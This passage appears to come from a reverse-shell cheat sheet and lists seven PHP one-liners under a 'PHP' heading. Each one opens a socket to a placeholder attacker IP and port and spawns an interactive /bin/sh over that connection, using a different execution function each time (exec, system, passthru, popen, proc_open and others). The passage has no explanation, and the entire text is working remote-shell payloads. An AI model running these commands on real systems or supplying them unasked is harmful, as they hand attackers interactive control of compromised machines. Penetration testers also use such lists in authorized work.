#### PHP

```php
php -r '$sock=fsockopen("$ATTACKER_IP",$ATTACKER_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",$ATTACKER_PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",$ATTACKER_PORT);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("$ATTACKER_IP",$ATTACKER_PORT);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",$ATTACKER_PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",$ATTACKER_PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

```php
php -r '$sock=fsockopen("$ATTACKER_IP",$ATTACKER_PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```